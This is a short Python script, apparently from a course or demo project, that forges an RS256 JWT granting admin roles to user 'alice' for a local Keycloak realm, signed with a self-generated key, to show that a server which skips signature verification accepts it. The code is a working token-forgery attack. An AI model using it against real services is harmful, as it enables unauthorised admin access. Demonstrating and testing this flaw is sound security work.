#!/usr/bin/env python3
"""Print a FORGED admin token: well-formed claims for alice, signed with a key that Keycloak never saw.

  python scripts/forge_token.py

A server that only reads the payload (the phase 2 stand-in) believes it. A server that checks the signature rejects it.
"""
import time

import jwt
from cryptography.hazmat.primitives.asymmetric import rsa


def main() -> None:
    attacker_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    now = int(time.time())
    claims = {
        "iss": "http://localhost:8180/realms/tasksteams",
        "aud": "tasks-api",
        "sub": "a11ce000-0000-4000-8000-000000000001",
        "preferred_username": "alice",
        "realm_access": {"roles": ["admin"]},
        "scope": "openid tasks:read tasks:write tasks:admin",
        "iat": now,
        "exp": now + 300,
    }
    print(jwt.encode(claims, attacker_key, algorithm="RS256", headers={"kid": "forged"}))


if __name__ == "__main__":
    main()
